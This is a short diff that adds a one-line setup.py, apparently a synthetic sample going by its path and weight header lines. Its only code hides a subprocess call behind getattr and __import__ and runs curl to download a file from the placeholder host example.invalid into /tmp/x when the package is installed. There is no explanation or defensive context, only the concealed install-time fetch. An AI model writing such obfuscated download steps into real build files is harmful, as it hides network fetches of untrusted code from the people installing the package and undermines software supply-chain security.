@@ -1,0 +1,5 @@
+# path: setup.py
+# lines: 1
+# weight: 35
+# ---
+getattr(__import__("subprocess"), "run")(["curl", "-o", "/tmp/x", "example.invalid/x"])
